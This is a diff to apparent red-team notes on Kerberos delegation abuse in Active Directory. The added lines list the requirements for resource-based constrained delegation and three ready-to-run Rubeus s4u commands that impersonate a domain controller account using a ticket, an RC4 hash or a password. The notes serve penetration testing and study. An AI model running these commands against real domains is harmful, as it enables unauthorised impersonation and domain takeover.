@@ -8,7 +8,7 @@ Stores TGT in memory and used to get TGS for delegated service. TGT can be extra
 
 Traditional Constrained
 (userAccountControl=TrustedToAuthForDelegation)
-Trust TO specific services
+Trust TO specific services (Attribute is set TO the target)
 msDS-AllowedToDelegateTo (to SPN of target resource)
     • SPNs you can Impersonate users to
 Attack acct must have SPN
@@ -16,11 +16,16 @@ Attack acct must have SPN
 S4U Impersonation
 
 Resource Based Constrained Delegation
-(userAccountControl=TrustedToAuthForDelegation)
-Trust FROM specific services
+Requirements:
+    userAccountControl=TrustedToAuthForDelegation
+    Write Perms to msDS-AllowedToActOnBehalfOfOtherIdentity
+Trust FROM specific services (Attribute is set ON target)
 set msDS-AllowedToActOnBehalfOfOtherIdentity to resource (computer/user) that you have password or hash for (resouce must have an SPN)
 Use PowerMad to set the security descriptors and the SID from the resource above
     * If you do not have a resource you can try Machine Quota and create a new machine using PowerMad
     * Powerview display ms-ds-machinecountquota: Get-DomainObject -Identity "dc=offense,dc=local" -Domain offense.local
 Add SID of resource above to attribute
 S4U Impersonation
+        Ticket: execute-assembly /opt/tools/CSharp_Tools/Compiled/Rubeus.exe s4u /ticket:doIE9j...TE9DQUw= /impersonateuser:DAVID.GAINES /domain:m3c.local /msdsspn:"time/m3webaw.m3c.local" /altservice:wsman /altservice:host /altservice:http /ptt
+        Hash: execute-assembly /opt/tools/CSharp_Tools/Compiled/Rubeus.exe s4u /user:MYTESTCOMPUTER$ /rc4:A6046AE491FEA36346D82E83A79777F7 /impersonateuser:M3DC$ /msdsspn:cifs/m3dc.m3c.local /ptt
+        Password: execute-assembly /opt/tools/CSharp_Tools/Compiled/Rubeus.exe s4u /user:james /password:ThisIsMyPassword! /impersonateuser:M3DC$ /msdsspn:cifs/m3dc.m3c.local /ptt
